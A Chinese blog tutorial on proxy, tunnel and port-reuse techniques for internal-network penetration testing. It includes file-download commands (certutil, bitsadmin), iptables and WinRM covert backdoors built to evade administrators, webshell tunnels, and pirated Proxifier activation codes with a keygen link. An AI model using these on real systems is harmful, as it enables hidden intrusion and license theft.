---
title: 代理与隧道前置知识
date: 2026-04-07 10:00:00
categories:
  - 网络安全
tags:
  - 内网渗透
  - 代理
  - 隧道
  - 端口复用
---
# 代理与隧道

在进行渗透测试以及攻防演练的时候，通常会存在各种边界设备、软硬件防火墙、IPS等设备来检测外部连接情况，这些设备如果发现异常，就会对通信进行阻断。当拿到某网络主机的权限，发现无法将流量或者权限发送出来，对渗透造成了很大的影响，所以内网渗透必须需要了解到两个技术知识，代理与隧道技术。

代理技术解决的问题：代理简单来讲解决网络之间的通信问题，如内网与[外网](https://so.csdn.net/so/search?q=外网&spm=1001.2101.3001.7020)之间或者两者自己之间的通信，两个不同内网的通信就必须借助到代理，否则无法通讯。实际场景上来说，外网机被拿下之后，可将外网机作为攻击机的代理，访问内网。

隧道技术解决的问题：简单来讲就是解决流量无法发送，隧道技术多用来绕过一些安全设备的监控，如防火墙过滤问题，网络连接通讯问题，数据回链封装问题，对我们发送的流量进行了拦截，这个时候需要接触隧道技术绕过拦截，隧道技术就是使用不同的协议把走不通的路走通。走不同的协议技术建立通讯，可以说是其中也包括了一些代理的技术。实际上的场景，某一个协议被防火墙流量拦截，可尝试走其他出网协议通信。

### 常见网络架构

了解web网站之间的架构和相关协议，能让你更好的的对代理和隧道技术的运用有更深的认知，这是前置知识

第一种情况：网站用的是云服务器，只有一个 IP 地址，并且是真实网站 ip 地址。ping域名即拿到真实服务器ip

第二种情况：网站套了cdn，ping出来的不是真实ip地址。通过网站域名解析得到的 ip 地址都是 CDN 的地
址，并不是 web 服务器真实的 ip 地址。

[在线网站CDN检测工具，可以通过分布在全球的20余个服务器节点对指定网站进行IP检测，判断该网站是否部署在CDN上。 - UU在线工具 (uutool.cn)](https://uutool.cn/cdn-check/)

![image-20240817195521390](image-20240817195521390.png)



第三种情况：web采用了 Nginx 反向代理，并不知道网站服务器的真实 ip 地址

通过采用 Nginx 代理服务器来转发流量，可以很好的隐蔽真实的网站服务器。我们通过 ping 只可以得到 nginx 服务器的 ip 地址，但是这并不是真正网站服务器的 ip 地址，真正服务器隐藏在 nginx 代理服务器之后。并且网站也可以通过 Nginx 代理服务器来基于不同端口转发和负载均衡。

拓扑图如下:

<img src="image-20240817195851452.png" alt="image-20240817195851452" style="zoom:80%;" />

<img src="image-20240817200022198.png" alt="image-20240817200022198" style="zoom:67%;" />

nginx 根据请求的页面的不同后缀(.php .jsp等)，来转发给不同的端口进行解析。

具体情况具体判断，也有nginx服务器即也是web服务器的情况。比如同一服务器，nginx起一个80服务，tomcat启动一个8080的服务直接转发到本机的端口上。



第四种情况：web网站通过 NAT 映射，我们并不能知道网站服务器真实的ip地址

这种情况大多数是属于稍微大型的企业用户，拥有自己的机房。位于内网 DMZ 区的服务器通过 NAT 映射到公网地址。这时，我们通过 ping 得到的 ip 地址是企业位于公网处的 ip 地址，并不是真实的 ip 地址。

[什么是DMZ区域，DMZ区域的作用与原理 - airoot - 博客园 (cnblogs.com)](https://www.cnblogs.com/airoot/p/14653091.html)

![image-20240817204340018](image-20240817204340018.png)

更大型的企业，出口处有几个运营商，提供热备份和负载均衡。这时，我们通过域名查询 ip 地址可以找到 3 个 ip 地址。但是这 3 个 ip 地址都是出口处运营商的 ip地址，并不是真正的 web 服务器的 ip 地址，真正的 web 服务器在内网中

[热备份、温备份、冷备份(Hot/Warm/Cold Backup)_热备 冷备 温备-CSDN博客](https://blog.csdn.net/u014558484/article/details/52017089)

![image-20240817204741050](image-20240817204741050.png)

### web网站出网探测

第一种情况：禁止出站 IP
如果目标主机设置了严格的策略，只允许主动连接公网指定的 IP。这样的话，就没办法反弹 shell 了

第二种情况：禁止出站端口
如果防火墙上做了限制，只允许该服务器访问特定端口。那么，这样的话，我们就必须得找到允许访问的端口了。一般来说，如果目标是限制的出站端口，那么允许出站端口大概率是 80、443、8080、8443、8090 之类的 web 端口，但是也有可能是高范围端口。

Linux  探测shell脚本

```
for i in {440..449}; do
  timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i ************************open************************" || echo "$i closed"
done
```

![image-20240818201926612](image-20240818201926612.png)

在192.168.88.185这台主机开台web服务。

![image-20240818203159707](image-20240818203159707.png)

写入文本

```
for i in {440..449}; do
  timeout 0.5 bash -c "echo >/dev/tcp/baidu.com/$i" && echo "$i ************************open************************" || echo "$i closed"
done>>result.txt
```

nmap 探测命令

```
	nmap -sT -Pn -p- -v www.baidu.com
```

fscan探测

```
	fscan -h 182.61.200.6 -p 1-65535
```

masscan探测

```
	masscan -p 80,443,8000-9000 182.61.200.6 --rate=10000
```

禁止出站协议
	先探测目标机器允许哪些协议出公网。

探测icmp出网

​	ping命令，或者使用tcpdump icmp命令。tcpdump linux自带命令

​	服务端使用tcpdump icmp。客户端ping服务端的时候。就会有响应包

<img src="image-20240818204425151.png" alt="image-20240818204425151" style="zoom: 80%;" />

探测DNS协议出网

	Windows：nslookup、ping命令

```
Linux：nslookup、dig、ping命令
```

通过判断能否将域名解析为 ip，判断 DNS 协议是否出网。也可以将域名换成dnslog 的域名，再看 dnslog 能否收到请求

nslookup www.baidu.com

![image-20240818204738388](image-20240818204738388.png)

​																dig命令探测

<img src="image-20240818204930378.png" alt="image-20240818204930378" style="zoom: 50%;" />

​													dnslog接受到信息

<img src="image-20240818205008209.png" alt="image-20240818205008209" style="zoom:67%;" />

探测HTTP协议

```
Linux 系统可以使用 curl 命令：
curl http://192.168.10.13
Windows 系统可以使用以下命令：
certutil -urlcache -split -f http://192.168.88.185:8080/a.ser 会下载当前目录
	参数讲解：
		-urlcache：指定操作 URL 缓存。
		-split：指示 certutil 将下载的文件分割成多个小文件（如果需要的话）。
		-f：强制执行操作，不显示确认提示。
bitsadmin /transfer test http://192.168.10.13/1 c:\1 
	概念解释：
/transfer：指定要创建一个下载或上传任务。
指定下载文件名test，指定url下载到本地磁盘，与上个命令类似
powershell iwr -Uri http://192.168.10.13/1 -OutFile 1 -UseBasicParsing
```

![image-20240818210049157](image-20240818210049157.png)

### 端口映射

**一、什么端口映射？**

**端口映射：**端口映射就是将内网中的主机的一个端口映射到外网主机的一个端口，提供相应的服务。当用户访问外网IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。

**比如：**

我们在内网中有一台Web服务器，但是外网中的用户是**没有办法直接访问该服务器的**。于是我们可以在路由器上设置一个**端口映射**，只要外网用户访问路由器ip的80端口，那么路由器会把自动把流量转到内网Web服务器的80端口上。并且，在路由器上还存在一个Session，当内网服务器返回数据给路由器时，路由器能准确的将消息发送给外网请求用户的主机。在这过程中，路由器充当了一个反向代理的作用，他保护了内网中主机的安全。

### 端口转发

端口转发（Port forwarding），有时被叫做隧道，是安全壳（SSH） 为网络安全通信使用的一种方法。比如，我们现在在内网中，是没有办法直接访问外网的。但是我们可以通过路由器的 NAT 方式访问外网。假如我们内网现在有 100 台主机，那么我们现在都是通过路由器的这一个公网 IP 和外网通信的。那么，当互联网上的消息发送回来时，路由器是怎么知道这个消息是给他的，而另外消息是给你的呢？这就要我们的 ip 地址和路由器的端口进行绑定了，这时，在路由器中就会有一个内网 ip 和路由器端口对应的一张表。当路由器的 10000 端口收到消息时，就知道把消息发送给他，而当 20000 端口收到消息时，就知道把消息发送给你。这就是端口转发，其转发一个端口收到的流量，给另一个主机，后面的SSH隧道，以及各大隧道代理工具多少涉及到端口转发。还有一些如lcx，portmap，iox工具等等

### 内网穿透

   由于内网IP地址无法直接通过互联网的方式进行访问，但在实际场景中我们又希望我们部署在内网的服务可以通过互联网的方式进行访问，这时我们就可以利用“内网穿透”的方式来将计算机的内部IP转化为公网IP，在互联网侧直接访问内网主机中的服务，像这种方式我们称之为“内网穿透”。比较典型的工具：Frp，nps等。下面的工具将会涉及到

### 端口复用

端口复用是指不同的应用程序使用相同端口进行通讯。内网渗透中，搭建隧道时，服务器仅允许指定的端口对外开放。利用端口复用可以将3389或22等[端口转发](https://zhida.zhihu.com/search?q=端口转发&zhida_source=entity&is_preview=1)到如80端口上。在这种被限制的情况下，考虑端口复用。端口复用可以更好地隐蔽攻击行为。

如果外网服务器只允许 80 端口的流量进入。但是目标主机 22 端口只对内开放，所以必须得利用 80 端口做端口复用连接。

#### Linux 利用 iptables 做端口复用

##### iptables前置知识

最基本要学习一下，iptables的五链四表以及相关命令

[iptables防火墙理论清晰解释（四表、五链、流程图文并茂）学习不能忘！！！_防火墙的四表五连图-CSDN博客](https://blog.csdn.net/weixin_47151643/article/details/107736735)

[防火墙&iptables相关学习-CSDN博客](https://blog.csdn.net/a877558888/article/details/142317983?spm=1001.2014.3001.5501)

[iptables的四表五链与NAT工作原理 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/347754874)

##### 根据源地址做端口复用

```
实验环境：kali攻击机：192.168.88.185          web外网服务器ubuntu:192.168.88.141
ubuntu执行：
iptables -t nat -A PREROUTING -p tcp -s 192.168.88.185  --dport 80 -j REDIRECT --to-port 22
这条命令主要是将80端口服务重定向到22端口上
-----------------------------------------------------------------------------------------
攻击机执行：sudo ssh -p 80 root@192.168.88.141

```

- `-t nat`：指定使用`nat`表。
- `-A PREROUTING`：在`PREROUTING`链中添加规则。
- `-p tcp`：指定协议为TCP。
- `-s 192.168.88.185`：匹配源地址为`192.168.88.185`的数据包。
- `--dport 80`：匹配目标端口为`80`的数据包。
- `-j REDIRECT --to-port 22`：将匹配的数据包重定向到端口`22`。

<img src="image-20240917215041738.png" alt="image-20240917215041738" style="zoom:80%;" />

##### 根据源地址源端口做端口复用

```
ubuntu执行：
iptables -t nat -A PREROUTING -p tcp -s 192.168.88.185 --sport 33333 --dport 80 -j REDIRECT --to-port 22
kali执行：
socat -d -d  TCP-LISTEN:44444,fork,reuseaddr TCP:192.168.88.141:80,sourceport=33333 

ssh -p 44444 root@127.0.0.1  

根据源地址源端口做端口复用，也就是只有来自 192.168.88.185 主机的 33333 端口的访问 80 端口的流量会被转给 22 端口
iptables 重定向：将发往192.168.88.185上的源端口33333的TCP请求重定向到目标端口80，再重定向到端口22。
socat 转发：在本地监听端口44444，并将连接转发到192.168.88.141的端口80，指定源端口为33333。
ssh 连接：通过ssh连接到本地127.0.0.1的端口44444，并使用root用户登录。

socat使用：https://zhuanlan.zhihu.com/p/347722248
```

<img src="image-20240917223425096.png" alt="image-20240917223425096" style="zoom:67%;" />

socat -d -d  TCP-LISTEN:44444,fork,reuseaddr TCP:192.168.88.141:80,sourceport=33333 

- `-d -d`：启用调试模式，显示详细的调试信息。
- `TCP-LISTEN:44444`：在本地监听44444端口，等待TCP连接。
- `fork`：当有新的连接时，使用fork模式处理连接，即每个新连接都会派生一个新的进程进行处理。
- `reuseaddr`：允许在绑定地址时重用已经处于TIME_WAIT状态的socket地址。
- `TCP:192.168.88.141:80`：建立到远程主机192.168.88.141的80端口的TCP连接。
- `sourceport=33333`：将本地的33333作为源端口。

该方法不支持多连接，本地的 33333 端口已经被第一个 SSH 连接占用了。并且这样做需要连接的机器拥有单独的公网 ip

##### 利用 ICMP 协议做遥控开关

```
除了ping命令以上都在192.168.88.141机子上完成
记得清空原有的实验命令 iptables -t nat -F
iptables -t nat  -nL 查看配置


#创建一个名为 LETMEIN 的自定义链。
iptables -t nat -N LETMEIN
#创建端口复用规则，将流量转发至 22 端口
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
#开启开关，如果接收到一个长为 1139 的 ICMP 包，则将来源 IP 添加到加为 letmein的列表中，icmp type 8类型指的是ping
iptables -t filter -A INPUT -p icmp --icmp-type 8 -m length --length 1139 -m recent --set --name letmein --rsource -j ACCEPT

#关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将来源 IP 从 letmein 列表中去掉
iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1140 -m recent --name letmein --remove -j ACCEPT

#如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN

#开启复用，向目标发送一个长度为 1111 的 ICMP 数据包（加上包头 28，总长度实际为1139）
ping -c 1111 -s 1111 192.168.88.141
#关闭复用，向目标发送一个长度为 1112 的 ICMP 数据包（加上包头 28，总长度实际为 1140）
ping -c 11112 -s 1112 192.168.88.141

iCMP 包头的大小通常为 8 字节。IP 包头的大小通常为 20 字节（不考虑选项） 所以总共28
    -c 1：表示只发送一次（1） ICMP 请求。
    -s 1111：表示发送的 ICMP 数据包的负载为 1111 字节。需要注意的是，这个负载并不包括 ICMP 包头和 IP 包头的大小。

```



<img src="image-20240917233151257.png" alt="image-20240917233151257" style="zoom: 80%;" />



##### 利用 TCP 协议做遥控开关

```
#创建复用链子
iptables -t nat -N LETMEIN2

#创建端口复用规则，将流量转发至 22 端口
iptables -t nat -A LETMEIN2 -p tcp -j REDIRECT --to-port 22

#开启开关，如果接收到一个含有 threathuntercoming 的 TCP 包，则将来源 IP 添加到加为 letmein2 的列表中

iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name LETMEIN2 --rsource -j ACCEPT

#关闭开关，如果接收到一个含有 threathunterleaving 的 TCP 包，则将来源 IP 从 letmein2 的列表中移除

iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name LETMEIN2 --remove --rsource -j ACCEPT

#如果发现 SYN 包的来源 IP 处于 letmein2 列表中，将跳转到 LETMEIN2 链进行处理，有效时间为 3600 秒

iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name LETMEIN2 --rsource -j LETMEIN2

以上都在192.168.88.141执行
#开启复用，开启后本机到目标 80 端口的流量将转发至目标的 SSH 在kali执行
echo threathuntercoming | socat - tcp:192.168.88.141:80
#关闭复用，关闭后，80 恢复正常 在kali执行
echo threathunterleaving | socat - tcp:192.168.88.141:80
```

<img src="image-20240918000515592.png" alt="image-20240918000515592" style="zoom:80%;" />

学习参考：https://cloud.tencent.com/developer/article/1937107



#### Windows 利用 WinRM 实现端口复用打造隐蔽后门

WinRM介绍

WinRM是Windows Remote Managementd（Windows远程管理）的简称。它基于Web服务管理(WebService-Management)标准，WinRM2.0默认端口5985（HTTP端口）或5986（HTTPS端口）。如果所有的机器都是在域环境下，则可以使用默认的5985端口，否则的话需要使用HTTPS传输(5986端口)。使用WinRM我们可以在对方有设置防火墙的情况下远程管理这台[服务器](https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065)，因为启动WinRM服务后，防火墙默认会放行5985端口。WinRM服务在Windows Server 2012以上服务器自动启动。在WindowsVista上，服务必须手动启动。WinRM的好处在于，这种远程连接不容易被察觉到，也不会占用远程连接数！



##### **WinRM端口复用原理**

该端口复用的原理是使用Windows的远程管理服务WinRM，结合 HTTP.sys 驱动自带的端口复用功能，一起实现正向的端口复用后门。

关于WinRM服务，传送门：WinRM远程管理工具的使用 

而HTTP.sys驱动是IIS的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫Port Sharing(端口共享)。所有基于HTTP.sys驱动的HTTP应用都可以共享同一个端口，只需要各自注册的URL前缀不一样。而WinRM就是在HTTP.sys上注册了 wsman 的URL前缀，默认监听 5985端口。因此，在安装了IIS的Windows[服务器](https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065)上，开启WinRM服务后修改默认监听端口为80或新增一个80端口的监听即可实现端口复用，通过Web端口登录Windows服务器。

使用 netsh http  show  servicestate 命令可以查看所有在 HTTP.sys 驱动上注册过的URL前缀。

<img src="image-20240919072403657.png" alt="image-20240919072403657" style="zoom:80%;" />

Windows Server  2012以上的服务器操作系统中，WinRM服务默认启动并监听了5985端口。如果服务器本来就监听了80和5985端口，则所以我们既需要保留原本的5985监听端口，同时需要新增Winrm监听80端口。这样的话，WinRM同时监听80和5985端口。既能保证原来的5985端口管理员可以正常使用，我们也能通过80端口远程连接WinRM。

![image-20240919072338374](image-20240919072338374.png)

```
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
新增80监听
```

<img src="image-20240919073040605.png" alt="image-20240919073040605" style="zoom:80%;" />

```javascript
查看WinRM状态
winrm enumerate winrm/config/listener
可发现80端口已被监听  八零端口的web服务可以正常运行
```

![image-20240919073101443](image-20240919073101443.png)

#### **修改WinRM默认监听的端口**

如果该计算机上原本没有开启WinRM服务的话，则需要将WinRm端口监听端口修改为80端口。不然管理员看到该机器开起来5985端口的话，肯定会起疑心。

```
快速启动WinRM
winrm  quickconfig  -q

修改WinRM默认端口为80
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
```

<img src="image-20240919094009450.png" alt="image-20240919094009450" style="zoom:80%;" />

查看netstat -ano ，发现没有默认5985端口





##### **远程连接WinRM**

本地需要连接WinRM服务时，首先也需要配置启动WinRM服务。如果是工作组环境的话，还需要设置信任连接的主机，执行以下两条命令即可。

```
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
通过WinRM连接，并执行whoami命令
winrs -r:http://192.168.10.20 -u:administrator -p:root whoami
通过WinRM连接，并获得交互式的shell
winrs -r:http://192.168.10.20 -u:administrator -p:root cmd

以上两条执行命令要在域环境或专用网络上运行才行。

```



<img src="image-20240919094340195.png" alt="image-20240919094340195" style="zoom:80%;" />



[工具使用 | WinRM远程管理工具的使用-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1937035)

[红蓝对抗 | Windows利用WinRM实现端口复用打造隐蔽后门-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1937116)

## 代理技术

代理实际上指的就是代理服务器，英文叫作proxy  server，它的功能是代理网络用户去取得网络信息。形象地说，它是网络信息的中转站。在我们正常请求一个网站时，是发送了请求给Web服务器，Web服务器把响应传回给我们。如果设置了代理服务器，实际上就是在本机和服务器之间搭建了一个桥，此时本机不是直接向Web服务器发起请求，而是向代理服务器发出请求，请求会发送给代理服务器。

然后由代理服务器再发送给Web服务器，接着由代理服务器再把Web服务器返回的响应转发给本机。这样我们同样可以正常访问网页，但这个过程中Web服务器识别出的真实IP就不再是我们本机的IP了，就成功实现了IP伪装，这就是代理的基本原理。

### 正向代理

简单的说，就是客户端主动向代理发送一个请求，然后代理向服务器请求并将获取的内容返回给客户端。渗透当中适用场景。内网中的其他机器是不允许来自外网机器的访问的。这时候，我们可以将这台外网服务器设置成为代理，使得我们自己的攻击机可以直接访问与操作内网中其他机器。也就是出网被限制的情况。

![image-20240817210408966](image-20240817210408966.png)

#### Neo-reGeorg代理工具

Neo-reGeorg是常见的http正向隧道工具，是reGeorg工具的升级版。增加了很多特性，例如像内容加密、避免被检测、请求头定制、响应码定制、支持py3等等

下载地址：https://github.com/L-codes/Neo-reGeorg

特点
• 传输内容经过变形 base64 加密，伪装成 base64 编码
• 直接请求响应可定制化 (如伪装的 404 页面) • HTTP Headers 的指令随机生成，避免特征检测
• HTTP Headers 可定制化
• 自定义 HTTP 响应码
• 多 URL 随机请求
• 服务端 DNS 解析
• 兼容 python2 / python3
• 服务端环境的高兼容性
• (仅 php) 参考 https://github.com/sensepost/reGeorg 实现单 Session
创建多 TCP 连接，应对部分负载均衡场景
• aspx/ashx/jsp/jspx 已不再依赖 Session，可在无 Cookie 等恶劣环境正常运行。支持内网转发，应对负载均衡环境

在服务端生成代理脚本,key最好高强度

```
python3 neoreg.py generate -k sdsd
```

会创建 neoreg_servers 目录并在该目录下生成如下代理脚本

然后只需要将对应语言的脚本上传到目标 web 目录下，访问如下，说明 ok

<img src="image-20240821110623589.png" alt="image-20240821110623589" style="zoom: 67%;" />

然后使用 neoreg.py 执行如下命令连接代理文件，该命令运行成功后，会在本地建立 socks 代理，并且监听 1080 端口

python3 neoreg.py -l 0.0.0.0 -p 1080 -k sdsd -u http://www.test.com/tunnel.php

<img src="image-20240821110831020.png" alt="image-20240821110831020" style="zoom:67%;" />

配合Proxifier或者SocksCap64.exe使用即可，这里展示使用cmd和火狐演示

cmd设置代理，这里选择第一个

```
set https_proxy=socks5://127.0.0.1:1080pro
set http_proxy=socks5://127.0.0.1:1080
set ftp_proxy=socks5://127.0.0.1:1080
```

设置代理后只对当前命令窗口生效，重新打开CMD需要再次设置代理。

参考：[windows CMD和Linux终端设置代理_windows设置socks cmd-CSDN博客](https://blog.csdn.net/yimisiyang/article/details/104010989#:~:text=在CMD窗口输入如下指令设置代理： set,http_proxy%3Dsocks5%3A%2F%2F127.0.0.1%3A1080 set https_proxy%3Dsocks5%3A%2F%2F127.0.0.1%3A1080)

然后curl www.baidu.com,显示内容代表正向代理成功

![image-20240821111241761](image-20240821111241761.png)

火狐配合此插件即可

<img src="image-20240821111211879.png" alt="image-20240821111211879" style="zoom:67%;" />

Neo-reGeorg支持自定义页面和响应码，自定义的页面跟py同一目录，相关参数命令

```
python3 neoreg.py generate -k sdsd --file 404.html --httpcode 404
```

#### ABPTTS

一款基于 SSL 加密的 HTTP 端口转发工具，全程通信数据加密，比 reGerog 都要稳定。使用 python2 编写，但是该工具只支持 aspx 和 jsp 脚本的网站。TCP流量通过HTTP/HTTPS进⾏流量转发的⼯具项目地址：https://github.com/nccgroup/ABPTTS

执行如下命令，会在 ABPTTS 目录下生成 webshell 目录

客户端做了http端口转发，访问服务端的3389就是访问了客户端的3389，走的http协议

```
服务端：python2 abpttsfactory.py -o webshell
#windows客户端
python2 abpttsclient.py -c webshell\config.txt -u http://10.211.55.3:8080/shiro/a
bptts.jsp -f 127.0.0.1:3389/10.211.55.3:3389 --unsafetls

#linux/mac 客户端
python2 abpttsclient.py -c webshell//config.txt -u http://10.211.55.3:8080/shiro/abptts.jsp -f 127.0.0.1:3389/10.211.55.3:3389 --unsafetls
```

这里没环境就不展示了

#### reDuh

仓库地址：https://github.com/sensepost/reDuh，这类工具很多

 具体参考：https://blog.csdn.net/wsnbbz/article/details/104917606



#### proxychains代理链

```
proxychains-ng    项目地址https://github.com/rofl0r/proxychains-ng.git
```

Centos下的安装https://blog.csdn.net/holyvslin/article/details/132885252

Ubuntu下的安装 https://cloud.tencent.com/developer/article/1157554

安装proxychains4 kali上自带，debian版本apt-get install proxychains4

删除命令：apt-get autoremove proxychains

那我们用kali自带的。proxychains4配置文件在 /etc/proxychains4.conf

<img src="image-20240818113013201.png" alt="image-20240818113013201" style="zoom: 80%;" />

用法实例：proxychains4   nmap -sT -Pn -p 80,445  10.211.55.7

​			验证：proxychains4 curl www.google.com

​			![image-20240818113707920](image-20240818113707920.png)

需要注意的是，使用 nmap 挂代理扫描端口的时候，需要加参数 -sT -Pn

#### Proxifier的使用

类似的还有SOCKSCAP。

安装Proxifier，我们用的经典汉化3.1版本，激活码如下

```
5EZ8G-C3WL5-B56YG-SCXM9-6QZAP
G3ZC7-7YGPY-FZD3A-FMNF9-ENTJB
YTZGN-FYT53-J253L-ZQZS4-YLBN9 
```

配置文件，新建代理并检查可不可用。

![image-20240818193929850](image-20240818193929850.png)

![image-20240818194111822](image-20240818194111822.png)

​			转发至7890端口

<img src="image-20240818194549418.png" alt="image-20240818194549418" style="zoom:80%;" />



<img src="image-20240821203734219.png" alt="image-20240821203734219" style="zoom:80%;" />



##### Proxifier+bp抓包微信小程序

设置好代理服务器，走https 127.0.0.1:8080，不是8080也可以，你bp设的什么抓包就设置什么

<img src="image-20240827203155816.png" alt="image-20240827203155816" style="zoom: 80%;" />

在代理规则上设置微信的小程序相关的WeChatApp.exe，让他走代理，其余的不相关的直连direct，即不走代理

<img src="image-20240827203936611.png" alt="image-20240827203936611" style="zoom:80%;" />

```
WeChatAppEx.exe;WechatBrowser.exe
```

<img src="image-20240827203903064.png" alt="image-20240827203903064" style="zoom:67%;" />

##### vmare虚拟机出网流量全部走代理

 vmare相关虚拟机和流量全部走你的 Proxifier隧道，隧道在连着clash的代理端口。虚拟机可走代理

配置两个代理规则。

<img src="image-20240827204446617.png" alt="image-20240827204446617" style="zoom:80%;" />



<img src="image-20240827204516802.png" alt="image-20240827204516802" style="zoom:80%;" />

```
应用上复制上，然后走你代理的端口
vmware.exe; vmnetcfg.exe; vmnat.exe; vmrun.exe; vmware-vmx.exe; mkssandbox.exe; vmware-hostd.exe; vmnat.exe; vmnetdhcp.exe
```

kali在没有配置任何的东西下直接开机访问均可访问

<img src="image-20240827204723938.png" alt="image-20240827204723938" style="zoom:67%;" />

<img src="image-20240827204847756.png" alt="image-20240827204847756" style="zoom:80%;" />

一定程度上可减少被溯源的概率，参考：https://mp.weixin.qq.com/s/5KHhVl9ItgDvsO3eQov9tA

https://www.cnblogs.com/wushiyiwuzhong/p/17809020.html Proxifier新版注册，有熟练度用英文版吧

https://github.com/y9nhjy/Proxifier-Keygen   Proxifier注册机



##### clash+bp抓微信小程序

其实clash也可以做正代走隧道，只不过自己写yaml配置，这里放个微信小程序走clash隧道的yaml，上面抓不了可以试试这种

网上pc端抓小程序bp+Proxifier，bp+Clash一样可以。编辑好yaml导入配置

  -   - ```
        proxies:
        
          - name: Whistle
            type: http
            server: 127.0.0.1  
            port: 8080 
            proxy-groups:
          - name: Proxy
            proxies:
              - Whistle
                type: select
                rules:
          - PROCESS-NAME,WeChatAppEx.exe,Whistle
          - PROCESS-NAME,WeChat.exe,Whistle
          - PROCESS-NAME,WechatBrowser.exe,Whistle
          - MATCH,DIRECT
        ```

        

        <img src="image-20240827205805581.png" alt="image-20240827205805581" style="zoom:80%;" />

        抓不到包的确保有没有Proxifier在影响？
        
        参考：https://mp.weixin.qq.com/s/gvKpiUdRaQZ1YrqUFP2bIA
        
        ### 配置解释
        
        1. **`proxies`**:
           - `name`: 代理的名称（例如 `Whistle`）。
           - `type`: 代理的类型，可更改为 `socks5`等。
           - `server`: 代理服务器的地址（例如 `127.0.0.1`）。
           - `port`: SOCKS5 代理服务器的端口（例如 `1080`，请根据实际情况调整）。
        2. **`proxy-groups`**:
         - `name`: 代理组的名称（例如 `Proxy`）。
         - `type`: 选择类型的代理组，这里选择了 `select`，用户可以选择不同的代理。
         - `proxies`: 代理组中包含的代理列表（在此示例中，只有一个代理 `Whistle`）。
      3. **`rules`**:
         - `PROCESS-NAME`: 规则根据进程名称匹配并将流量转发到指定代理（`Whistle`）。
         - `MATCH`: 匹配所有未被其他规则匹配的流量，这里设置为 `DIRECT`，表示不使用代理直接访问。

    涉及到微信相关运行程序就会走127.0.0.1:8080，配合bp抓包。比Proxifier好一点
    
    涉及到多条链式代理，将代理A作为代理B的上游代理，通过配置代理B的规则和策略路由来间接实现代理链的效果。总的来说不如上面那两个方便，主要是要写配置远没有图形化快。因为本就不是链式代理的思想设计，属于节点类
    
    **上游（Upstream）**:
    
    - **定义**: 上游指的是一个代理节点将数据发送到另一个代理节点的过程。在这个过程中，数据流动的方向是从当前节点传递到下一个节点。
    - **作用**: 上游节点通常用于将流量转发到另一个节点或代理，以实现更复杂的代理链或路由功能。例如，一个节点可以配置为将请求转发到另一个节点进行处理，这样第一个节点作为上游节点，第二个节点作为下游节点。
    
    **下游（Downstream）**:
    
    - **定义**: 下游指的是接收数据并处理的过程。在数据流动中，下游节点是最终处理或转发数据的节点。
    - **作用**: 下游节点是数据流经过的最后一站，它负责实际的数据处理或最终转发。下游节点可以是最终的目标服务器或另一个代理节点。

[Socks代理和HTTP代理有什么区别？怎么选？ - 个人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000044837094)

[代理模式：全局 规则 直连 脚本四种模式的区别_代理模式 全局 规则 直连-CSDN博客](https://blog.csdn.net/qq_61504864/article/details/137371350)

#### SOCKS隧道代理

Socks是Socket Secure的缩写，其是一种工作在OSI七层模型中的第五层网络会话层协议，Socks主要的作用是代表客户端将任何协议或者任何程序产生的任何类型的流量路由到服务器上，以此来将本地和远端两个系统连接起来。

由于Socks其处于第七层和第四层模型之间，因此socks可以支持HTTP、HTTPS、FTP、SSH、FTP等多种协议，Socks从版本上来讲，又可分为socks4和socks5这两种版本，目前socks协议最新版本为socks5，socks4和socks5这两者版本最主要的区别是socks4仅支持TCP代理，不支持UDP代理以及各种验证协议，socks5不仅支持TCP/UDP代理以及各种[身份验证](https://cloud.tencent.com/product/mfas?from_column=20065&from=20065)协议的同时，还会通过身份验证建立完整的TCP 连接，并使用Secure Shell (SSH) 加密隧道的方法来中继流量，在红蓝攻防对抗中，我们经常会利用Socks5来建立通信隧道以此来访问远程核心靶标系统中的内部网络。

参考：https://cloud.tencent.com/developer/article/2388466

### 反向代理

和正向代理相反，攻击机 只向 proxy 发送普通的请求，具体让他转到哪里，proxy 自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许 数据进出的时候可以有效的进行穿透。Nginx 就是性能非常好的反向代理服务器，它可以用来做负载均衡。

![image-20240817210426932](image-20240817210426932.png)

两者的区别
正向代理是我们自己客户端通过proxy代理找服务端，反向代理是服务端主动通过proxy找客户端
用途差异
• 正向代理的典型用途是为在防火墙内的局域网客户端提供访问 Internet 的、途径。正向代理还可以使用缓冲特性减少网络使用率；
• 反向代理的典型用途是将防火墙后面的服务器提供给 Internet 用户访问。反向代理还可以为后端的多台服务器提供负载平衡，或为后端较慢的服务器提供缓冲服务。
• 另外，反向代理还可以启用高级 URL 策略和管理技术，从而使处于不同web 服务器系统的 web 页面同时存在于同一个 URL 空间下。

安全差异
• 正向代理允许客户端通过它访问任意网站并且隐藏客户端自身，因此必须采取安全措施以确保仅为经过授权的客户端提供服务；
• 反向代理对外都是透明的，访问者并不知道自己访问的是一个代理。

## 隧道协议

